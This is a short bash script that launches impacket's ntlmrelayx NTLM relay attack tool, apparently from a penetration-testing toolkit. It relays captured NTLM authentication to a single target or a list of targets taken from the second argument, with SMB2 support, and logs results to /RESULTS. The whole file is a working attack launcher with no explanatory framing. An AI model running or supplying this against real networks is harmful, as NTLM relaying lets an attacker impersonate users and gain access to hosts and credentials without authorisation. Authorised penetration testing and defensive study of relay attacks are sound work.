#!/bin/bash
if [ -f "$2" ]; then
   impacket-ntlmrelayx -l /RESULTS -tf "$2" -smb2support
else
    impacket-ntlmrelayx -l /RESULTS -t "$2" -smb2support
fi